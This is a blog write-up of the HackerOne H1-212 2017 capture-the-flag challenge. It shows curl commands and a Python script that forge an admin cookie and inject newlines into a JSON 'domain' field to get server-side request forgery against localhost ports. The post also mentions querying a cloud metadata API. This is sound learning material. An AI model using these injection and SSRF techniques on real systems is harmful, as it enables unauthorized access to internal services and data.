# H1-212 2017: Writeup

Originally published at: https://zeta-two.com/ctf/2017/11/20/h1212-writeup.html

Hackerone is hosting an event in New York this december and ran a CTF as a secondary way to get an invite to the event.
I visited the H1-702 event in Las Vegas this summer and it was really fun so of course I had to give this a shot as well.
The following information was given on [the CTF page](https://www.hackerone.com/blog/hack-your-way-to-nyc-this-december-for-h1-212).

> An engineer of acme.org launched a new server for a new admin panel at http://104.236.20.43/. He is completely confident that the server can’t be hacked. He added a tripwire that notifies him when the flag file is read. He also noticed that the default Apache page is still there, but according to him that’s intentional and doesn’t hurt anyone. Your goal? Read the flag!

## Initial exploration

Let's start by visiting the provided page.

> curl 'http://104.236.20.43/'

```
<!DOCTYPE html ..>  
<html>  
	... very long apache2 default html page ...  
</html>  
```

Ok, so we have the default Apache2 page. The server probably uses name-based virtual hosts to decide what content to serve.
Since we are told that this server belongs to "acme.org", let's try to use that host.

> curl 'http://104.236.20.43/' -H 'Host: acme.org'

```
<!DOCTYPE html ..>  
<html>  
	... very long apache2 default html page ...  
</html>  
```

That did not give us anything new. We are also told that this is some kind of admin panel. Maybe it is on a subdomain, let's try "admin.acme.org".

> curl 'http://104.236.20.43/' -H 'Host: admin.acme.org'

Interesting, a different, seemingly empty, response. Let's check the headers.

> curl -v 'http://104.236.20.43/' -H 'Host: admin.acme.org'

```
> GET / HTTP/1.1
> Host: admin.acme.org
> 
< HTTP/1.1 200 OK
< Set-Cookie: admin=no
<
```

So, the page sets a cookie called "admin" to "no". Let's see what happens if we change it to "yes".

> curl -v 'http://104.236.20.43/' -H 'Host: admin.acme.org' -b admin=yes

```
> GET / HTTP/1.1
> Host: admin.acme.org
> Cookie: admin=yes
>
< HTTP/1.1 405 Method Not Allowed
<
```

We are not allowed to do GET requests here, let's try POST instead.

> curl -v -X POST 'http://104.236.20.43/' -H 'Host: admin.acme.org' -b admin=yes

```
> POST / HTTP/1.1
> Host: admin.acme.org
> Cookie: admin=yes
>
< HTTP/1.1 406 Not Acceptable
<
```

There is something else with out request that is incorrect.
Here I consulted the [MDN documentation on HTTP 406](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/406) which led me to try various values for the "Accept-\*" headers. 
Eventually I realized that there are different ways to deliver data in a POST request. Probably the most common way to do it in modern applications nowadays is using JSON, so I tried changing the Content-Type header accordingly.

> curl -v -X POST 'http://104.236.20.43/' -H 'Host: admin.acme.org' -H 'Content-Type: application/json' -b admin=yes

```
> POST / HTTP/1.1
> Host: admin.acme.org
> Cookie: admin=yes
> Content-Type: application/json
> 
< HTTP/1.1 418 I'm a teapot
< Content-Type: application/json
< 
{"error":{"body":"unable to decode"}}
```

Progress! However, now something is wrong with the body. Very reasonable, given that we haven't provided one yet. I started out with just an empty JSON object.

> curl -X POST 'http://104.236.20.43/' -H 'Host: admin.acme.org' -H 'Content-Type: application/json' -b admin=yes --data '{}'

```
{"error":{"domain":"required"}}
```

Now it decodes but it seems a mandatory key is missing. Let's add it.

> curl -X POST 'http://104.236.20.43/' -H 'Host: admin.acme.org' -H 'Content-Type: application/json' -b admin=yes --data '{"domain":""}'

```
{"error":{"domain":"incorrect value, .com domain expected"}}
```

Domain has to be a .com domain. I still have no idea what this is going to be used for so let's just put in something.

> curl -X POST 'http://104.236.20.43/' -H 'Host: admin.acme.org' -H 'Content-Type: application/json' -b admin=yes --data '{"domain":"www.a.com"}'

```
{"error":{"domain":"incorrect value, sub domain should contain 212"}}
```

That's an oddly specific requirement on the value.

> curl -X POST 'http://104.236.20.43/' -H 'Host: admin.acme.org' -H 'Content-Type: application/json' -b admin=yes --data '{"domain":"212.a.com"}'

```
{"next":"\/read.php?id=0"}
```

Finally! The request seems to have been processed correctly and we get a new URI to look at.
Checking the contents of it just gives us the following.

> curl 'http://104.236.20.43/read.php?id=0' -H 'Host: admin.acme.org' -b admin=yes

```
{"data":""}
```

Maybe the system uses the domain to fetch some kind of data. I used my own domain to set up a simple page just containning "Hello World!" and submitted it to the system.

> curl -X POST 'http://104.236.20.43/' -H 'Host: admin.acme.org' -H 'Content-Type: application/json' -b admin=yes --data '{"domain":"212.zeta-two.com"}'

```
{"next":"\/read.php?id=1"}
```

> curl 'http://104.236.20.43/read.php?id=1' -H 'Host: admin.acme.org' -b admin=yes

```
{"data":"SGVsbG8gV29ybGQhCg=="}
```

> echo "SGVsbG8gV29ybGQhCg==" |base64 -d

```
Hello World!
```

## Get SSRF

As I thought, the page seems to take the provided domain and fetch data from it.
This is a classic situation were there could be room for a SSRF vulnerability.
To be able to work with this more methodically, I created a small Python script, looking something like the one below, to automate the fetching and decoding of domains.
Using this script I started to manually "fuzz" the API by providing various malformed domains in different formats.

{% highlight python %}
#!/usr/bin/env python
import requests
import base64

URL = 'http://admin.acme.org'

TARGET = '212.zeta-two.com'

r = requests.post(URL + '/index.php', headers={'Content-Type': 'application/json'}, json={'domain': TARGET}, cookies={'admin':'yes'})
print(r.headers)
print(r.text)
path2 = r.json()['next']
print('Next: %s' % path2)
read_id = int(path2.split('id=')[-1])
print('Next ID: %d' % read_id)

r = requests.get(URL + '/read.php?id=%d' % read_id + '', cookies={'admin':'yes'})
print(r.headers)
result_text = base64.b64decode(r.json()['data'])
print('Res: "%s"' % result_text)
{% endhighlight %}

To expand on my previous knowledge on this, I used [Orange's materials on SSRF](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf) as a source of inspiration.
After a while a noticed that there was something strange going on when I used newlines in the domain. Specifically I finally noticed that when using newlines, the id returned from the first request increased by more than 1.
It looked something like this

> curl -X POST 'http://104.236.20.43/' -H 'Host: admin.acme.org' -H 'Content-Type: application/json' -b admin=yes --data '{"domain":"212.zeta-two.com"}' 

```
{"next":"\/read.php?id=9"}
```
  
  
> curl -X POST 'http://104.236.20.43/' -H 'Host: admin.acme.org' -H 'Content-Type: application/json' -b admin=yes --data '{"domain":"212.zeta-two.com"}'

```
{"next":"\/read.php?id=10"}
```
  
> curl -X POST 'http://104.236.20.43/' -H 'Host: admin.acme.org' -H 'Content-Type: application/json' -b admin=yes --data '{"domain":"212\n212.zeta-two.com"}'

```
{"next":"\/read.php?id=12"}
```

Notice that in the last request, the ID grows by 2, not 1. I tried submitting the a domain with the value `212\nlocalhost\n212.zeta-two.com` and then visiting, not the ID I got back but one less than it.
This gave me the Apache2 default page again. Apparently, the API first validates the domain, then splits it on newlines and creates one item per line.
I checked if I could add a path to it as well using `212\nlocalhost/flag\n212.zeta-two.com` which gave me "You really thought it would be that easy? Keep digging!" as a result.
Ok so it seems we have a reliable SSRF, what about URL queries? Unfortunataly, if the "domain" contained any of the following characters: "#%?&\" the API would error out and tell me they aren't allowed.
However, since ":" isn't blacklisted, it's possible to try other ports. A typical scenario is to have an application server accessible only locally running on another port.
So I tried `212\nlocalhost:PORT/flag\n212.zeta-two.com` substituting "PORT" for a number of common ports.

I tried the following ports: 1-1024, 3000, 4000, 5000, 3306, 5432, 8000-9000.

What I didn't know is that I was _so_ close to getting the flag but I missed it which sent me on a 10+ hours detour trying all kinds of crazy stuff.


## 10 hours sidetrack

So, after missing the flag with so little I started trying other stuff.
I tried making requests to a server I control and sending different responses, both on the DNS and HTTP level.
I tried command injections, SQL injections noSQL injections, XXE, XSS (in case there was some kind of monitoring) and memory corruption techniques but it resulted in nothing.
I tried a bunch of different encoding tricks to try to get "?" or "%" into the URL.
I also found out the server was hosted at [Digital Ocean](https://www.digitalocean.com/) and called [their metadata API](https://developers.digitalocean.com/documentation/metadata/).
This gave me internal IP adresses and other data which could have been interesting in other scenarios.
I also looked at the Apache2 /server-status page where I could see requests from all the other competitors. I even ran a monitor on this for a while in case "the admin" was visitng some secret URL.

## Resolution

After a while I revisited trying some local ports on the server. I think I might have seen the number 1337 somewhere and thought I'd test it just for fun.
Running my script with the equivalent of the following two, the flag suddenly popped out.

> curl -X POST 'http://104.236.20.43/' -H 'Host: admin.acme.org' -H 'Content-Type: application/json' -b admin=yes --data '{"domain":"212\nlocalhost:1337/flag\n212.zeta-two.com"}'

```
{"next":"\/read.php?id=4"}
```
  
> curl 'http://104.236.20.43/read.php?id=3' -H 'Host: admin.acme.org' -b admin=yes

```
{"data":"RkxBRzogQ0YsMmRzVlwvXWZSQVlRLlRERXBgdyJNKCVtVTtwOSs5RkR7WjQ4WCpKdHR7JXZTKCRnN1xTKTpmJT1QW1lAbmthPTx0cWhuRjxhcT1LNTpCQ0BTYip7WyV6IitAeVBiL25mRm5hPGUkaHZ7cDhyMlt2TU1GNTJ5OnovRGg7ezYK"}
```
  
> echo "RkxBRzogQ0YsMmRzVlwvXWZSQVlRLlRERXBgdyJNKCVtVTtwOSs5RkR7WjQ4WCpKdHR7JXZTKCRnN1xTKTpmJT1QW1lAbmthPTx0cWhuRjxhcT1LNTpCQ0BTYip7WyV6IitAeVBiL25mRm5hPGUkaHZ7cDhyMlt2TU1GNTJ5OnovRGg7ezYK" |base64 -d

```
FLAG: CF,2dsV\/]fRAYQ.TDEp`w"M(%mU;p9+9FD{Z48X*Jtt{\%vS($g7\S):f%=P[Y@nka=<tqhnF<aq=K5:BC@Sb*{[%z"+@yPb/nfFna<e$hv{p8r2[vMMF52y:z/Dh;{6
```

Apparently there was a local nginx instance running on port 1337. Who does that?!? With a mix of relief, happiness and disgust I finally got the flag and solved the challenge.
Had I just scanned a few more ports before moving on, I would have had the flag within hours of starting this, now it turned into a week long exploration of web techniques.

Thank you Hackerone for this challenge. I enjoyed (most parts of) solving it a lot.